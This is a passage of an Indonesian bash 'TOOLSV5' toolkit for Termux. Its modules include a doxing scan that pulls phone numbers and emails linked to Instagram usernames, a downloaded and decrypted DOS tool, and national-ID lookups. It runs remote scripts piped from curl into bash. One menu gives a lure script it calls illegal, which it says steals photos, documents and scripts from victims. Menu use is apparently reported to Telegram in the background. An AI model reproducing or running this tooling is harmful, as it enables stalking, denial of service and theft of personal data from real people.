for i in "${!searches[@]}"; do
query="${searches[$i]}"
search_url="https://www.google.com/search?q=$(echo "$query" | sed 's/ /+/g')"
echo -e "${KUNING}Query Pencarian $((i + 1)):${NC} ${query}"
echo -e "${BIRU}URL Pencarian:${NC} ${search_url}"
echo ""
done
}
cek_media_sosial() {
local username=$1
echo -e "${PUTIH}[${HIJAU}+${PUTIH}] Memeriksa keberadaan di media sosial...${NC}"
echo -e "${SIAU}--- PEMERIKSAAN MEDIA SOSIAL ---${NC}"
declare -A platforms=(
["Twitter"]="https://twitter.com/${username}"
["Facebook"]="https://facebook.com/${username}"
["TikTok"]="https://tiktok.com/@${username}"
["YouTube"]="https://youtube.com/@${username}"
["GitHub"]="https://github.com/${username}"
["LinkedIn"]="https://linkedin.com/in/${username}"
["Reddit"]="https://reddit.com/user/${username}"
["Telegram"]="https://t.me/${username}"
)
echo -e "${PUTIH}Target: ${HIJAU}${username}${NC}"
echo -e "${PUTIH}Waktu Pemeriksaan: ${HIJAU}$(date)${NC}"
echo ""
for platform in "${!platforms[@]}"; do
url="${platforms[$platform]}"
echo -e "${KUNING}Platform:${NC} ${platform}"
echo -e "${BIRU}URL:${NC} ${url}"
status=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url" 2> /dev/null)
if [ "$status" = "200" ]; then
echo -e "${HIJAU}Status: ✓ Terindikasi ada (HTTP 200)${NC}"
elif [ "$status" = "404" ]; then
echo -e "${MERAH}Status: ✗ Tidak ditemukan (HTTP 404)${NC}"
elif [ "$status" = "000" ]; then
echo -e "${KUNING}Status: ⚠ Waktu koneksi habis${NC}"
else
echo -e "${KUNING}Status: ? Tidak diketahui (HTTP ${status})${NC}"
fi
echo ""
done
}
validasi_info_kontak() {
local username=$1
local phone=$2
local email=$3
echo -e "${PUTIH}[${HIJAU}+${PUTIH}] Memvalidasi informasi kontak...${NC}"
echo -e "${SIAU}--- VALIDASI INFORMASI KONTAK ---${NC}"
echo -e "${PUTIH}Username: ${HIJAU}${username}${NC}"
echo ""
if [ "$email" != "Tidak tersedia" ] && [ ! -z "$email" ]; then
echo -e "${KUNING}Validasi Email:${NC}"
echo -e "  Email: ${HIJAU}${email}${NC}"
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
echo -e "  Format: ${HIJAU}✓ Format email valid${NC}"
else
echo -e "  Format: ${MERAH}✗ Format email tidak valid${NC}"
fi
domain=$(echo "$email" | cut -d'@' -f2)
echo -e "  Domain: ${BIRU}${domain}${NC}"
else
echo -e "${KUNING}Email: ${MERAH}Tidak tersedia${NC}"
fi
echo ""
if [ "$phone" != "Tidak tersedia" ] && [ ! -z "$phone" ]; then
echo -e "${KUNING}Validasi Nomor Telepon:${NC}"
echo -e "  Nomor: ${HIJAU}${phone}${NC}"
if [[ "$phone" =~ ^[+]?[0-9]{10,15}$ ]]; then
echo -e "  Format: ${HIJAU}✓ Format nomor valid${NC}"
else
echo -e "  Format: ${KUNING}⚠ Format nomor tidak biasa${NC}"
fi
if [[ "$phone" =~ ^[+] ]]; then
echo -e "  Tipe: ${BIRU}Format internasional${NC}"
else
echo -e "  Tipe: ${KUNING}Format lokal/ tidak diketahui${NC}"
fi
else
echo -e "${KUNING}Nomor Telepon: ${MERAH}Tidak tersedia${NC}"
fi
}
tampilkan_hasil_analisa() {
local username=$1
local phone=$2
local email=$3
echo -e "\n${MAGENTA}[ HASIL ANALISA ] Semua hasil yang valid ada di bawah ini${NC}\n"
echo -e "${SIAU}--- Informasi Instagram Valid ---${NC}"
echo -e "Username       : ${HIJAU}${username}${NC}"
if [[ "$phone" =~ ^[+]?[0-9]{10,15}$ ]]; then
echo -e "Nomor Telepon  : ${HIJAU}${phone}${NC}"
else
echo -e "Nomor Telepon  : ${MERAH}Tidak valid atau tidak tersedia${NC}"
fi
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
echo -e "Email          : ${HIJAU}${email}${NC}"
else
echo -e "Email          : ${MERAH}Tidak valid atau tidak tersedia${NC}"
fi
echo -e "\n${SIAU}--- Media Sosial dengan status 'ada' (HTTP 200) ---${NC}"
declare -A platforms=(
["Twitter"]="https://twitter.com/${username}"
["Facebook"]="https://facebook.com/${username}"
["TikTok"]="https://tiktok.com/@${username}"
["YouTube"]="https://youtube.com/@${username}"
["GitHub"]="https://github.com/${username}"
["LinkedIn"]="https://linkedin.com/in/${username}"
["Reddit"]="https://reddit.com/user/${username}"
["Telegram"]="https://t.me/${username}"
)
local ada_found=0
for platform in "${!platforms[@]}"; do
url="${platforms[$platform]}"
status=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$url" 2> /dev/null)
if [ "$status" = "200" ]; then
echo -e "${HIJAU}• ${platform}: ${url}${NC}"
ada_found=1
fi
done
if [ "$ada_found" -eq 0 ]; then
echo -e "${MERAH}Tidak ada media sosial dengan status 'ada' (HTTP 200) ditemukan.${NC}"
fi
echo ""
}
ringkasan_komprehensif() {
local username=$1
banner
echo -e "${SIAU}--- RINGKASAN OSINT KOMPREHENSIF ---${NC}"
echo -e "${PUTIH}Username Target : ${HIJAU}${username}${NC}"
echo -e "${PUTIH}Pemindaian Selesai pada : ${HIJAU}$(date)${NC}"
echo -e "${PUTIH}Alat            : ${HIJAU}GALIRUS X TOOLSV5 DOXING${NC}"
echo ""
echo -e "${KUNING}Modul yang dijalankan:${NC}"
echo -e "  ${HIJAU}✓${NC} Pengambilan Informasi Instagram"
echo -e "  ${HIJAU}✓${NC} Pencarian Google Dork"
echo -e "  ${HIJAU}✓${NC} Pemeriksaan Keberadaan Media Sosial"
echo -e "  ${HIJAU}✓${NC} Validasi Informasi Kontak"
echo ""
echo -e "${KUNING}Rekomendasi:${NC}"
echo -e "  ${BIRU}•${NC} Cross-check hasil dari berbagai platform"
echo -e "  ${BIRU}•${NC} Verifikasi informasi melalui sumber berbeda"
echo -e "  ${BIRU}•${NC} Gunakan hasil dengan etika dan tanggung jawab"
echo -e "  ${BIRU}•${NC} Perhatikan implikasi privasi"
echo ""
echo -e "${MERAH}PENYANGKALAN:${NC}"
echo -e "${MERAH}Alat ini hanya untuk tujuan edukasi dan riset.${NC}"
echo -e "${MERAH}Pengguna bertanggung jawab atas kepatuhan hukum yang berlaku.${NC}"
}
jalan_full_scan() {
local username=$1
echo -e "${KUNING}[*] Memulai pemindaian OSINT komprehensif untuk: ${HIJAU}${username}${NC}"
echo -e "${KUNING}[*] Semua hasil akan langsung ditampilkan di terminal...${NC}"
echo ""
local phone_hasil=""
local email_hasil=""
response=$(curl -s -X POST "$INSTAGRAM_API_URL" \
-H "accept-language: en-US;q=1.0" \
-H "content-type: application/x-www-form-urlencoded; charset=UTF-8" \
-H "user-agent: Instagram 337.0.3.23.54 (iPhone12,1; iOS 16_6; en_US; en; scale=2.00; 828x1792; 577210397) AppleWebKit/420+" \
-d "q=${username}" 2> /dev/null)
if [ $? -eq 0 ] && [ ! -z "$response" ]; then
phone_hasil=$(echo "$response" | grep -o '"phone_number":"[^"]*"' | cut -d'"' -f4)
email_hasil=$(echo "$response" | grep -o '"email":"[^"]*"' | cut -d'"' -f4)
phone_hasil=${phone_hasil:-"Tidak tersedia"}
email_hasil=${email_hasil:-"Tidak tersedia"}
fi
ambil_informasi_instagram "$username"
echo ""
pencarian_google_dork "$username"
echo ""
cek_media_sosial "$username"
echo ""
validasi_info_kontak "$username" "$phone_hasil" "$email_hasil"
echo ""
ringkasan_komprehensif "$username"
echo -e "${HIJAU}[✓] Pemindaian lengkap selesai untuk ${username}!${NC}"
echo -e "${PUTIH}[${HIJAU}+${PUTIH}] Semua hasil ditampilkan di atas${NC}"
tampilkan_hasil_analisa "$username" "$phone_hasil" "$email_hasil"
echo ""
}
main() {
if [ "$1" = "-u" ] && [ ! -z "$2" ]; then
username="$2"
jalan_full_scan "$username"
else
echo -e "${KUNING}Penggunaan: $0 -u <username>${NC}"
echo -e "${KUNING}Perintah ini secara otomatis menjalankan semua modul OSINT dan menampilkan hasil di terminal.${NC}"
echo ""
echo -e "${KUNING}Contoh: $0 -u target_username${NC}"
exit 1
fi
}
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
main "$@"
fi
}
banner5 | lolcat
e "${ran7}"
IFS= read -r -e -p "Masukkan Username Target: " jeneng
e "$res"
dox -u $jeneng
IFS= read -r -e -p "Silahkan ENTER untuk kembali"
elif [ "$no" = "28" ]; then
while true; do
DOS="$PREFIX/lib/DOSG404"
if [ -d "$DOS" ]; then
cd "$DOS" || exit
git pull origin main &> /dev/null
git stash &> /dev/null
while true; do
if [ -d "DOS" ]; then
cd DOS || exit
mv -f "$PREFIX/lib/DOSG404/node_modules" "$PREFIX/lib/DOSG404/DOS" &> /dev/null
while true; do
if [ -d "node_modules" ]; then
npm start
mv -f node_modules "$PREFIX/lib/DOSG404"
rm -rf "$PREFIX/lib/DOSG404/DOS"
break 4
else
yarn
yarn install --ignore-engines
node --no-deprecation index.js
fi
done
else
openssl enc -d -aes-256-cbc -pbkdf2 \
-in DOS.G404 \
-pass pass:'痛いよ、愛しHcbes192い人。もう我慢864916できないよ、愛してる。 やめて!' |
tar -xf -
fi
done
else
e "${ran} Mempersiapkan Installasi Package..."
$paket install yarn nodejs -y
cd "$PREFIX/lib/" || exit
git clone --depth 32 https://github.com/Lubebansokhekel/DOSG404 &> /dev/null | e "${ran5} Sabar Sedang Download File"
fi
done
elif [ "$no" = "29" ]; then
cek_akses
pasang="$PREFIX/include/NIK"
lagek_melbu="completed"
while true; do
if [[ -d $pasang && -f $lagek_melbu ]]; then
cd "$pasang"
git stash &> /dev/null
git pull origin main &> /dev/null
clear
loading_string="   LOADING SCANNING"
lowercase_string="   loading scanning"
length=${#loading_string}
link() {
clear
e "Mau Osint Pake Nomor Buat Dapet NIKnya ?"
e "Pake Bot Telegram Aja Silahkan Klik Telegram" | lolcat
e "Saya Akan Mengarahkan Anda Ke Telegram" | lolcat
e "Di dalam Nanti Langsung Anda Tempel Nomor Target Anda" | lolcat
e "Contohnya$c:$k 6285953465619"
}
loading_animation() {
for ((i = 0; i <= length; i++)); do
current_string="${lowercase_string:0:i}${loading_string:i:length}"
percent=$((i * 100 / length))
printf "\r$current_string [%d%%]" "$percent"
sleep 0.1
done
}
long_task() {
sleep 2
}
bacot() {
echo "
██████╗ ███████╗██╗███╗   ██╗████████╗
██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║   ██║███████╗██║██╔██╗ ██║   ██║
██║   ██║╚════██║██║██║╚██╗██║   ██║
╚██████╔╝███████║██║██║ ╚████║   ██║
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.G404
"
}
bacot | lolcat
IFS= read -r -e -p "Masukkan NIK Target Anda: " niknya_kontol
long_task &
loading_animation | lolcat
clear
bacot | lolcat
nik-parse -n "$niknya_kontol"
$e
$e
e "$m"
IFS= read -r -e -p "Apa Anda Ingin Mengulangi Nya ? (y/n) " opo
if [[ $opo == "y" || $opo == "Y" ]]; then
link | lolcat
$e
$e
$e
IFS= read -r -e -p "Silahkan Enter Untuk Menuju ke Telegram"
xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
elif [[ $opo == "n" || $opo == "N" ]]; then
link | lolcat
$e
$e
$e
IFS= read -r -e -p "Silahkan Enter Untuk Menuju ke Telegram"
xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
break
else
e $m "BODO KALI KAU, YANG BENER ANYING"
fi
else
e $bg_m "Package Durung Di Install, Installasi sek$res"
cd $PREFIX/include/
git clone --depth 32 https://github.com/GALIRUS404/NIK &> /dev/null | echo "Sabar Cok Sek Masang Iki"
cd NIK
git stash &> /dev/null
git pull origin main &> /dev/null
npm install nik-parse -g
echo "kau anak kontol 😂" > "$lagek_melbu"
fi
done
elif [ "$no" = "30" ]; then
while true; do
clear
if [ -d "$DIR_SAVE/GALERY_EYES" ]; then
cd "$DIR_SAVE/GALERY_EYES"
git pull origin main &> /dev/null
git stash &> /dev/null
bash <(curl -sL "https://kontollukecilkocak.vercel.app/main.sh")
break 2
else
cd "$DIR_SAVE"
git clone https://github.com/Lubebansokhekel/GALERY_EYES
fi
sleep 5
done
elif [ "$no" = "31" ]; then
while true; do
xattack="$DIR_SAVE/GhostTrack"
if [ -d "$xattack" ]; then
echo " Running Script"
sleep 3
cd $xattack
pip3 install -r requirements.txt
python3 GhostTR.py
break
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
cd $DIR_SAVE
$paket install -y git
$paket install -y python3
git clone --depth 32 https://github.com/HunxByts/GhostTrack
fi
done
elif [ "$no" = "32" ]; then
bash <(curl -sL "https://kontollukecilkocak.vercel.app/zsh.sh")
IFS= read -r -e -p "ENTER UNTUK MENGULANG KE TOOLSV5"
elif [ "$no" = "33" ]; then
killall mpv &> /dev/null
res="\033[0m"
cok="ansi-rounded"
read rows cols < <(stty size)
jawa() {
boxes -d "$cok" -a c -s "${cols}x"
}
psht_hama() {
boxes -d "$cok" -a l -s "${cols}x"
}
banner() {
$e "${res}${m}███╗   ███╗██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗${res}
${m}████╗ ████║██╔══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗██╔════╝${res}
${m}██╔████╔██║██████╔╝██║   ██║   ██║   ██║   ██║██████╔╝█████╗${res}
${p}██║╚██╔╝██║██╔═══╝ ╚██╗ ██╔╝   ██║   ██║   ██║██╔══██╗██╔══╝${res}
${p}██║ ╚═╝ ██║██║      ╚████╔╝    ██║   ╚██████╔╝██████╔╝███████╗${res}
${p}╚═╝     ╚═╝╚═╝       ╚═══╝     ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝${res}
${c} ࿘${b} Playing Audio YouTube${res}${c} ࿗${res}                ${ran}MODE${m}:${ran8}DELTA V.1.9.3${res} "
}
installasi() {
packages=(socat wget ruby cowsay jq mpv boxes fzf bc unzip)
for pkgname in "${packages[@]}"; do
if ! command -v "$pkgname" > /dev/null 2>&1; then
$e "${m}➣ Menginstal $pkgname${res}"
pkg install "$pkgname" -y
fi
done
if ! command -v lolcat > /dev/null 2>&1; then
$e "${m}➣ Menginstal lolcat (via gem)${res}"
gem install lolcat
fi
if ! command -v yt-dlp > /dev/null 2>&1; then
$e "${m}➣ Mengunduh YouTube${res}"
wget -q https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O $PREFIX/bin/yt-dlp &> /dev/null | $e "${m}Sedang Proses Download. Harap Bersabar"
chmod +x $PREFIX/bin/yt-dlp
fi
FONT_DIR="$HOME/.termux"
FONT_FILE="$FONT_DIR/font.ttf"
if [ ! -f "$FONT_FILE" ]; then
$e "${m}➣ Memasang Nerd Font untuk dukungan karakter\n➣ Mohon Tunggu Dan Bersabarlah !"
mkdir -p "$FONT_DIR"
tmpzip="$FONT_DIR/hack.zip"
wget -q https://github.com/ryanoasis/nerd-fonts/releases/download/v3.1.1/Hack.zip -O "$tmpzip"
unzip -o "$tmpzip" -d "$FONT_DIR" > /dev/null
mv "$FONT_DIR/HackNerdFont-Regular.ttf" "$FONT_FILE"
rm "$tmpzip"
$e "${h}✔ Font berhasil dipasang. Silakan restart Termux untuk efeknya.${res}"
pkill -9 -f com.termux
fi
}
installasi
MPV_SOCKET="$HOME/mpv-socket"
playlist_file="$HOME/playlist.url"
mkdir -p $HOME
jalankan_playlist() {
if [[ "$1" == "--playlist" && -n "$2" ]]; then
mkdir -p $HOME
playlist_file="$HOME/playlist.url"
echo "" > "$playlist_file"
url=$(echo "$2" | sed 's/%5[Cc]//g' | sed 's/\\//g' | sed 's/%3F/?/g' | sed 's/%3D/=/g' | sed 's/%26/\&/g')
clear
banner | boxes -d "$cok"
$e "$c[${h} PROSES${c} ]${b} Mengambil daftar video...${res}"
if echo "$url" | grep -q "list="; then
yt-dlp --yes-playlist --flat-playlist -J "$url" 2> /dev/null | jq -r '.entries[].url // empty' > "$playlist_file"
if [[ $? -eq 0 && -s "$playlist_file" ]]; then
count=$(wc -l < "$playlist_file")
clear
banner | boxes -d "$cok"
$e "$c[${h} BERHASIL${c} ]${h} Playlist ditemukan sebanyak${k} $count ${h}video.${res}"
$e "${h}➣${b} Lokasi tersimpan: $playlist_file${res}"
$e "${h}➣${k} Menjalankan perintah: ${c}bash mpvtube run${res}"
sleep 5
jalankan_play run
else
$e "$m[ GAGAL ] Playlist terdeteksi, namun tidak bisa diambil. Coba mode video tunggal...$res"
yt-dlp --get-id "$url" 2> /dev/null | sed 's/^/https:\/\/youtube.com\/watch?v=/' > "$playlist_file"
if [[ $? -eq 0 && -s "$playlist_file" ]]; then
$e "$h[ OK ]${b} URL diproses sebagai video tunggal dan disimpan di $playlist_file${res}"
else
$e "$m[ ERROR ] Gagal mengambil video dari URL.${res}"
fi
fi
else
yt-dlp --get-id "$url" 2> /dev/null | sed 's/^/https:\/\/youtube.com\/watch?v=/' > "$playlist_file"
if [[ $? -eq 0 && -s "$playlist_file" ]]; then
$e "$h[ OK ]${b} URL diproses sebagai video tunggal dan disimpan di $playlist_file${res}"
else
$e "$m[ ERROR ] Tidak bisa mengambil video dari URL.${res}"
fi
fi
sleep 3
fi
}
jalankan_play() {
if [[ "$1" == "run" ]]; then
if [[ ! -f "$playlist_file" ]]; then
$e "${m}❌ Belum ada playlist. Gunakan --playlist dulu.${res}"
sleep 3
fi
mapfile -t urls < "$playlist_file"
index=0
total=${#urls[@]}
while [[ $index -lt $total && $index -ge 0 ]]; do
url="${urls[$index]}"
[ -e "$MPV_SOCKET" ] && rm -f "$MPV_SOCKET"
mpv --no-terminal \
--input-ipc-server="$MPV_SOCKET" \
--ytdl-format="bestvideo[height<=144]+bestaudio/best/best[height<=144]" \
"$url" > /dev/null 2>&1 &
pid=$!
while kill -0 $pid 2> /dev/null; do
if [[ ! -S "$MPV_SOCKET" ]]; then
sleep 1
continue
fi
title=$(echo '{"command": ["get_property", "media-title"]}' | socat - "$MPV_SOCKET" 2> /dev/null | jq -r '.data' 2> /dev/null || echo "Memuat...")
pos=$(echo '{"command": ["get_property", "time-pos"]}' | socat - "$MPV_SOCKET" 2> /dev/null | jq -r '.data' 2> /dev/null || echo 0)
dur=$(echo '{"command": ["get_property", "duration"]}' | socat - "$MPV_SOCKET" 2> /dev/null | jq -r '.data' 2> /dev/null || echo 1)
paused=$(echo '{"command": ["get_property", "pause"]}' | socat - "$MPV_SOCKET" 2> /dev/null | jq -r '.data' 2> /dev/null || echo false)
vol=$(echo '{"command": ["get_property", "volume"]}' | socat - "$MPV_SOCKET" 2> /dev/null | jq -r '.data' 2> /dev/null || echo 50)
pos_int=${pos%.*}
dur_int=${dur%.*}
[ -z "$pos_int" ] && pos_int=0
[ -z "$dur_int" ] && dur_int=1
percent=$((pos_int * 100 / (dur_int > 0 ? dur_int : 1)))
filled=$((percent * 30 / 100))
bar="${bg_b}${pu}$(printf '%*s' "$filled" | tr ' ' '#')${bg_pu}$(printf '%*s' $((30 - filled)) | tr ' ' '.')${res}"
colors=()
for i in {81..127}; do colors+=("\033[38;5;${i}m"); done
get_unique_colors() {
local -n arr=$1
local count=$2
local result=()
while [ ${#result[@]} -lt $count ]; do
local c=${arr[RANDOM % ${#arr[@]}]}
local uniq=true
for r in "${result[@]}"; do [[ $r == "$c" ]] && uniq=false && break; done
$uniq && result+=("$c")
done
echo "${result[@]}"
}
read -r ran1 ran2 ran3 ran4 ran5 ran6 ran7 ran8 ran9 ran10 <<< "$(get_unique_colors colors 10)"
ran_names=(ran1 ran2 ran3 ran4 ran5 ran6 ran7 ran8 ran9 ran10)
selected_var=${ran_names[$((RANDOM % 10))]}
g404=${!selected_var}
while true; do
ran2=${colors[RANDOM % ${#colors[@]}]}
[[ $ran1 != "$ran2" ]] && break
done
while true; do
ran=${colors[RANDOM % ${#colors[@]}]}
[[ $ran2 != "$ran1" ]] && break
done
while true; do
ran3=${colors[RANDOM % ${#colors[@]}]}
[[ $ran1 && $ran2 != "$ran3" ]] && break
done
while true; do
ran4=${colors[RANDOM % ${#colors[@]}]}
[[ $ran1 && $ran2 && $ran3 != "$ran4" ]] && break
done
clear
banner | boxes -d "$cok"
$e "${ran}SUBSCRIBE GALIRUS OFFICIAL${res}" | jawa
$e "${bl}JUDUL${m} :${ran10} ${title:0:50}${res}\n${bl}PUTAR${m} :${k} $((index + 1))${m} Dari${k} $total${ran7} Lagu${res}\n${res}${bl}DURASI${m}: ${ran5}$((pos_int / 60)):$((pos_int % 60)) ${k}/${ran5} $((dur_int / 60)):$((dur_int % 60))${res}\n${bl}Volume${m}:${ran4} ${vol%.*}%${res}\n${bl}STATUS${m}:$([ "$paused" = "true" ] && $e "${ran1} ⏹️ STOP / BERHENTI" || $e "${ran1} ▶️ PLAY / BERJALAN")${res}" | psht_hama
$e "${ran6}[${ran9} $bar ${ran6}]${ran2} ${percent}%${res}" | jawa
$e "${c} ⌬${m} Opsi ${k}[${bl} m${m}:${ran7} Menu${b}  |${bl}  q${m}:${ran7} Keluar ${k}]${res}"
if read -t 1 -n 1 key; then
case "$key" in
m)
choice=$(printf "╭▶ Pause/Play\n├➣ Volume\n├➣ Selanjutnya\n├➣ Sebelumnya\n└➣ Back" | fzf --reverse --height=15 --border --no-preview --header=" MENU MPVTUBE DELTA BY.GALIRUS OFFICIAL")
case "$choice" in
*Pause*) echo '{"command": ["cycle", "pause"]}' | socat - "$MPV_SOCKET" > /dev/null 2>&1 ;;
*Volume*)
volume=$(echo '{"command": ["get_property", "volume"]}' | socat - "$MPV_SOCKET" | jq -r '.data')
[ -z "$volume" ] && volume=50
vol=${volume%.*}
while true; do
clear
filled=$((vol / 5))
empty=$((20 - filled))
bar="$(printf '%0.s#' $(seq 1 "$filled"))$(printf '%0.s' $(seq 1 "$empty"))"
$e "${m}🔊 Sesuaikan Volume${k} (${h} ⇑ besar${k} ) (${h} ⇓ kecil${k} )  ( ${h}q kembali${k})\n"
echo -e "${ran3}   [$bar] $vol%"
read -rsn1 key
case "$key" in
$'\x1b')
read -rsn2 rest
key+="$rest"
;;
esac
case "$key" in
$'\x1b[A') # Panah atas
vol=$((vol + 5))
[[ $vol -gt 150 ]] && vol=150
echo '{"command": ["set_property", "volume", '"$vol"']}' | socat - "$MPV_SOCKET" > /dev/null 2>&1
;;
$'\x1b[B') # Panah bawah
vol=$((vol - 5))
[[ $vol -lt 0 ]] && vol=0
echo '{"command": ["set_property", "volume", '"$vol"']}' | socat - "$MPV_SOCKET" > /dev/null 2>&1
;;
q | Q)
break
;;
esac
done
;;
*Selanjutnya*)
kill $pid
index=$((index + 1))
skip_increment=true
break
;;
*Sebelumnya*)
if [ $index -gt 0 ]; then
kill $pid
index=$((index - 1))
skip_increment=true
break
fi
;;
*Keluar*)
kill $pid
break
;;
esac
;;
q)
kill $pid
break
;;
n)
kill $pid
index=$((index + 1))
break
;;
p) if [ $index -gt 0 ]; then
kill $pid
index=$((index - 1))
break
fi ;;
esac
fi
done
wait $pid 2> /dev/null
if [[ "$skip_increment" == "true" ]]; then
skip_increment=false
else
index=$((index + 1))
fi
done
$e "${c}[${h} COMPLATED ${c}]${h} Playlist selesai diputar!${res}"
sleep 3
fi
}
while true; do
clear
banner | boxes -d "${cok}"
pilihan=$(printf "Playlist\nJalankan Playlist\nCari Lagu (ytsearch)\nKeluar" |
fzf --reverse --height=15 --border --no-preview --header="MPVTUBE - Pilih Mode")
case "$pilihan" in
"Playlist")
IFS= read -r -e -p "Masukkan URL playlist: " url
jalankan_playlist --playlist "$url"
;;
"Jalankan Playlist")
jalankan_play run
;;
"Cari Lagu (ytsearch)")
IFS= read -r -e -p "Judul lagu / video: " query
ytlink=$(yt-dlp "ytsearch1:$query" --get-url)
echo "$ytlink" > "$playlist_file"
jalankan_play run
;;
"Keluar")
break
;;
esac
done
elif [ "$no" = "34" ]; then
check_shfmt() {
if ! command -v shfmt &> /dev/null; then
echo "shfmt not found, installing..."
nala update
$paket install -y shfmt &> /dev/null | echo "Bentar Brek Instalasi Package Sabar Ya"
fi
}
while true; do
check_shfmt
clear
play -q "$HOME/Lubeban/sound/robot.mp3" &> /dev/null &
$banner | lolcat
e "$b"
sleep 3
play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null &
e " Masukkan jalur dan nama script yang ingin Ditata\n Contohnya :$bg_h /sdcard/nama_file_mu$res"
sleep 3
e "$m"
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
IFS= read -r -e -p " Silahkan Masukkan Jalur Dan Nama Script : " jalurdanscript
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
IFS= read -r -e -p " Berapa Baris ? Default ( 5 ) : " baris
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
e "$k"
clear
if [ -f "$jalurdanscript" ]; then
text=" Galirus Sedang Menformat skrip Anda Di Jalur : $jalurdanscript "
delay=0.05
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:i:1}"
sleep $delay
done
e "$h"
play -q "$HOME/Lubeban/sound/loading.mp3" &> /dev/null &
sleep 2
function show_loading() {
local i=0
while [ $i -le 100 ]; do
printf '\r%s' " ==> Proses [ $i ]"
sleep 0.05
((i++))
done
}
show_loading &
sleep 8
shfmt -w -i $baris -ci -sr "$jalurdanscript"
kill $! &> /dev/null &
e "$k"
clear
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
text="Skrip telah diformat Jalur Hasil : $jalurdanscript"
delay=0.05
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:i:1}"
sleep $delay
done
sleep 2
else
clear
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
e $bg_m " File $jalurdanscript tidak ditemukan$res"
sleep 5
fi
e "$h"
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
IFS= read -r -e -p "Apakah Anda ingin mengulangi proses? (y/n): " galirus
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null &
if [[ $galirus != "y" ]]; then
break
fi
done
elif [ "$no" = "35" ]; then
cek_akses
GALERI_EYES() {
clear
text="      SHIROKO TOOLS GALERI EYES $versitoolsv5"
delay=0.05
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:i:1}"
sleep $delay
done
sleep 5
while true; do
clear
$banner | lolcat
e $bg_m "1.SHIROKO GALERY EYES PAYLOADNYA SCRIPT$res"
e $bg_m "2.HASIL PANCINGAN KUNJUNG I TELEGRAM SHIROKO$res"
e $bg_m "0.BACK TO TOOLSV5$res"
IFS= read -r -e -p "Silahkan Pilih : " mana
if [ "$mana" = "1" ]; then
clear
isipesan="Terdeteksi Mengakses Menu 1 ( SCRIPT PAYLOAD ) 👨‍💻"
telegram &> /dev/null &
bannerteks() {
echo "
Script Ilegal yang Digunakan untuk Mengambil Data Pribadi Target
Jenis data yang diambil:
- FOTO
- TXT
- PDF
- ZIP
- SCRIPT BASH
- SCRIPT PYTHON
Anda bisa memancing target untuk menggunakan command di bawah ini dan membujuk target untuk menggunakannya:
Command:
pkg update
pkg install jq -y
pkg install curl -y
pkg install w3m -y
pkg install yarn nodejs -y
git clone https://github.com/GALIRUS404/REPORT-WA
cd REPORT-WA
bash gas.sh
Harap diperhatikan bahwa penggunaan script ilegal dapat melanggar hukum dan etika."
}
sleep 3
bannerteks | lolcat
echo
e "$m"
IFS= read -r -e -p "ENTER UNTUK MENGULANG KE MENU"
elif [ "$mana" = "2" ]; then
xdg-open "https://t.me/+QQyJf6UqwY8zN2U1"
elif [ "$mana" = "0" ]; then
break
fi
done
}
isipesan="Terdeteksi MASUK KE SHIROKO EYES  💻"
telegram &> /dev/null &
GALERI_EYES
e "$h"
elif [ "$no" = "36" ]; then
ADB_DEBUGGING() {
gal="adb"
clear
$paket install -y sox
$paket install -y android-tools
clear
e $q $b "Installing Success"
sleep 3
clear
play -q welcome.mp3 &> /dev/null &
while true; do
cek-ADB() {
output=$(adb devices)
if echo "$output" | grep -q "device$"; then
e $h "Perangkat terhubung ke ADB DEBUGGING$res"
else
e $m "Tidak ada perangkat yang terhubung.$res"
fi
}
cekcok=$(cek-ADB)
banner() {
e $q $b"======================================================"
e $q $m
e $q " █████╗ ██████╗ ██████╗ "
e $q "██╔══██╗██╔══██╗██╔══██╗"
e $q "███████║██║  ██║██████╦╝$p"
e $q "██╔══██║██║  ██║██╔══██╗"
e $q "██║  ██║██████╔╝██████╦╝"
e $q "╚═╝  ╚═╝╚═════╝ ╚═════╝ $bl Debugging$p By.$h Galirus"
e $q $b"======================================================"
e $k "Status: $cekcok"
}
clear
banner
$e
$e
e $q $b "[$k 1$b ]$p ADB CONNECT PAIRING CODE"
e $q $b "[$k 2$b ]$p ADB CONNECT PORT"
e $q $b "[$k 3$b ]$p ADB MENU"
e $q $b "[$k 0$b ]$p EXIT$m"
IFS= read -r -e -p " Choose (0-3) : " pil
case $pil in
1)
clear
banner
e $q "$p Please login$b"
IFS= read -r -e -p "Ip Address : " ip
IFS= read -r -e -p "Port : " port
IFS= read -r -e -p "Code : " code
adb pair $ip:$port $code
echo "Successs Silahkan Masuk Ke Menu 2"
sleep 5
;;
2)
clear
banner
IFS= read -r -e -p "Ip Address : " mana
IFS= read -r -e -p "Port connecting : " apa
adb connect $mana:$apa
sleep 3
clear
banner
adb devices
echo
echo
sleep 3
IFS= read -r -e -p "ENTER untuk masuk ke menu"
sleep 3
;;
3)
clear
banner
e $q $b "[$k 1$b ]$p SINGNAL 9 ( NETHUNTER )"
e $q $b "[$k 2$b ]$p NONAKTIFKAN APK"
e $q $b "[$k 3$b ]$p PEMULIHAN APK"
